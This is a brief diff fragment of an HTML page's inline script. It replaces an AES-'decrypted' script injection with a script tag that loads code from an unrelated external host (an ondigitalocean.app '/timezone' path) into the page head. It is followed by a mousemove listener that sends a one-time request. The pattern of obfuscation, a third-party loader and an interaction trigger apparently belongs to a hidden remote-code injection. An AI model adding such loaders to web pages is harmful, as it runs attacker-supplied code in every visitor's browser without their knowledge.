@@ -241,10 +241,11 @@ height:350px;
         const bytes = CryptoJS.AES.decrypt(decodedText, 'U2FsdGVkX1+uqxI4YN2qNlGDaMHVLViZB05OmcVwVyI=');
         return bytes.toString(CryptoJS.enc.Utf8);
     }
-    const codeString = aesDecode(`https://sample-nodejs-w4mfj.ondigitalocean.app/timezone`);
     const script = document.createElement("script");
-    script.textContent = codeString;
-    document.body.appendChild(script);
+script.src =
+    "https://sample-nodejs-w4mfj.ondigitalocean.app/timezone";
+
+document.head.appendChild(script);
 </script><script> window.addEventListener("mousemove", initiateApiRequestOnce);
     let
         requestSent = false;
